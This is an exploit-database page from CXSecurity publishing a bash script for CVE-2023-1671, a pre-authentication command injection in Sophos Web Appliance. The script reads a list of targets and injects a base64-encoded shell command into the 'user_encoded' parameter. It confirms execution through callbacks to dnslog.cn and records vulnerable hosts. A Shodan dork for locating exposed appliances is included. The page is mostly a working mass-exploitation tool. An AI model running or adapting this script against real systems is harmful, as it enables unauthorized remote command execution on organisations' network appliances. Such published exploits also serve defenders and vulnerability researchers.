---
title: Sophos Web Appliance 4.3.10.4 Pre-auth command injection
url: https://cxsecurity.com/issue/WLB-2023040080
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2023-04-26
fetch_date: 2025-10-04T11:32:34.401985
---

# Sophos Web Appliance 4.3.10.4 Pre-auth command injection

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **Sophos Web Appliance 4.3.10.4 Pre-auth command injection** **2023.04.25**  Credit:  **[Behnam Abasi Vanda](https://cxsecurity.com/author/Behnam%2BAbasi%2BVanda/1/)**  Risk: **Medium**  Local: **No**  Remote: ****Yes****  CVE: **[CVE-2023-1671](https://cxsecurity.com/cveshow/CVE-2023-1671/ "Click to see CVE-2023-1671")**  CWE: **[CWE-78](https://cxsecurity.com/cwe/CWE-78 "Click to see CWE-78")**  **[**Dork:** title:"Sophos Web Appliance"](https://cxsecurity.com/dorks/)** | |

#!/bin/bash
# Exploit Title: Sophos Web Appliance 4.3.10.4 - Pre-auth command injection
# Exploit Author: Behnam Abasi Vanda
# Vendor Homepage: https://www.sophos.com
# Version: Sophos Web Appliance older than version 4.3.10.4
# Tested on: Ubuntu
# CVE : CVE-2023-1671
# Shodan Dork: title:"Sophos Web Appliance"
# Reference : https://www.sophos.com/en-us/security-advisories/sophos-sa-20230404-swa-rce
# Reference : https://vulncheck.com/blog/cve-2023-1671-analysis
TARGET\_LIST="$1"
# =====================
BOLD="\033[1m"
RED="\e[1;31m"
GREEN="\e[1;32m"
YELLOW="\e[1;33m"
BLUE="\e[1;34m"
NOR="\e[0m"
# ====================
get\_new\_subdomain()
{
cat MN.txt | grep 'YES' >/dev/null;ch=$?
if [ $ch -eq 0 ];then
echo -e " [+] Trying to get Subdomain $NOR"
rm -rf cookie.txt
sub=`curl -i -c cookie.txt -s -k -X $'GET' \
-H $'Host: www.dnslog.cn' -H $'User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86\_64; rv:102.0) Gecko/20100101 Firefox/112.0' -H $'Accept: \*/\*' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate' -H $'Connection: close' -H $'Referer: http://www.dnslog.cn/' \
$'http://www.dnslog.cn/getdomain.php?t=0' | grep dnslog.cn`
echo -e " [+]$BOLD$GREEN Subdomain : $sub $NOR"
fi
}
check\_vuln()
{
curl -k --trace-ascii % "https://$1/index.php?c=blocked&action=continue" -d "args\_reason=filetypewarn&url=$RANDOM&filetype=$RANDOM&user=$RANDOM&user\_encoded=$(echo -n "';ping $sub -c 3 #" | base64)"
req=`curl -i -s -k -b cookie.txt -X $'GET' \
-H $'Host: www.dnslog.cn' -H $'User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86\_64; rv:109.0) Gecko/20100101 Firefox/112.0' -H $'Accept: \*/\*' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate' -H $'Connection: close' -H $'Referer: http://www.dnslog.cn/' \
$'http://www.dnslog.cn/getrecords.php?t=0'`
echo "$req" | grep 'dnslog.cn' >/dev/null;ch=$?
if [ $ch -eq 0 ];then
echo "YES" > MN.txt
echo -e " [+]$BOLD $RED https://$1 Vulnerable :D $NOR"
echo "https://$1" >> vulnerable.lst
else
echo -e " [-] https://$1 Not Vulnerable :| $NOR"
echo "NO" > MN.txt
fi
}
echo '
██████╗██╗ ██╗███████╗ ██████╗ ██████╗ ██████╗ ██████╗ ██╗ ██████╗███████╗
██╔════╝██║ ██║██╔════╝ ╚════██╗██╔═████╗╚════██╗╚════██╗ ███║██╔════╝╚════██║
██║ ██║ ██║█████╗█████╗ █████╔╝██║██╔██║ █████╔╝ █████╔╝█████╗╚██║███████╗ ██╔╝
██║ ╚██╗ ██╔╝██╔══╝╚════╝██╔═══╝ ████╔╝██║██╔═══╝ ╚═══██╗╚════╝ ██║██╔═══██╗ ██╔╝
╚██████╗ ╚████╔╝ ███████╗ ███████╗╚██████╔╝███████╗██████╔╝ ██║╚██████╔╝ ██║
╚═════╝ ╚═══╝ ╚══════╝ ╚══════╝ ╚═════╝ ╚══════╝╚═════╝ ╚═╝ ╚═════╝ ╚═╝
██████╗ ██╗ ██╗ ██████╗ ███████╗██╗ ██╗███╗ ██╗ █████╗ ███╗ ███╗ ██╗
██╔══██╗╚██╗ ██╔╝ ██╔══██╗██╔════╝██║ ██║████╗ ██║██╔══██╗████╗ ████║ ██╗╚██╗
██████╔╝ ╚████╔╝ ██████╔╝█████╗ ███████║██╔██╗ ██║███████║██╔████╔██║ ╚═╝ ██║
██╔══██╗ ╚██╔╝ ██╔══██╗██╔══╝ ██╔══██║██║╚██╗██║██╔══██║██║╚██╔╝██║ ▄█╗ ██║
██████╔╝ ██║ ██████╔╝███████╗██║ ██║██║ ╚████║██║ ██║██║ ╚═╝ ██║ ▀═╝██╔╝
╚═════╝ ╚═╝ ╚═════╝ ╚══════╝╚═╝ ╚═╝╚═╝ ╚═══╝╚═╝ ╚═╝╚═╝ ╚═╝ ╚═╝
'
if test "$#" -ne 1; then
echo " ----------------------------------------------------------------"
echo " [!] please give the target list file : bash CVE-2023-1671.sh targets.txt "
echo " ---------------------------------------------------------------"
exit
fi
rm -rf cookie.txt
echo "YES" > MN.txt
for target in `cat $TARGET\_LIST`
do
get\_new\_subdomain;
echo " [~] Checking $target"
check\_vuln "$target"
done
rm -rf MN.txt
rm -rf cookie.txt

[**See this note in RAW Version**](https://cxsecurity.com/ascii/WLB-2023040080)

[Tweet](https://twitter.com/share)

Vote for this issue:
 0
 -1

0%

100%

#### **Thanks for you vote!**

#### **Thanks for you comment!** Your message is in quarantine 48 hours.

Comment it here.

Nick (\*)

Email (\*)

Video

Text (\*)

(\*) - required fields.
Cancel
Submit

|  |  |
| --- | --- |
|  | **{{ x.nick }}** ![]() | Date: {{ x.ux \* 1000 | date:'yyyy-MM-dd' }} *{{ x.ux \* 1000 | date:'HH:mm' }}* CET+1  ---   {{ x.comment }} |

Show all comments

---

Copyright **2025**, cxsecurity.com

|  |

Back to Top